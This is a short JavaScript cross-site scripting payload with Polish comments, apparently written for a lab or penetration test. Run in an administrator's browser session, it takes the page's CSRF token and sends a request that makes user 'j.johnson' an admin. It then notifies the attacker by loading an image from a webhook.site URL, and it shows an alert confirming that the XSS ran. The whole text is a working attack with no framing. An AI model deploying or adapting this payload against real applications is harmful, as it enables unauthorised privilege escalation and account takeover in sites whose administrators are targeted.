// Nadanie Johnowi uprawnień
var data  = new FormData();
data.append("_method", "patch");
data.append("user[access_level]", "admin");
data.append("authenticity_token", document.getElementsByName("authenticity_token")[0].value);
fetch("/admin/users/j.johnson", {method: 'POST', body: data});

// Powiadomienie Johna o nowych uprawnienaich ominięciem CORS (opcjonalne)
var img = document.createElement("img")
img.src = "https://webhook.site/8cd96a70-2482-4c0c-9731-ab15df2fb72c?d=JohnZostalAdminem";
document.body.appendChild(img);

// Pokazanie alertu dla zobrazowania kiedy kod zostanie wykonany (opcjonalne)
alert('Kod XSS został wykonany!');
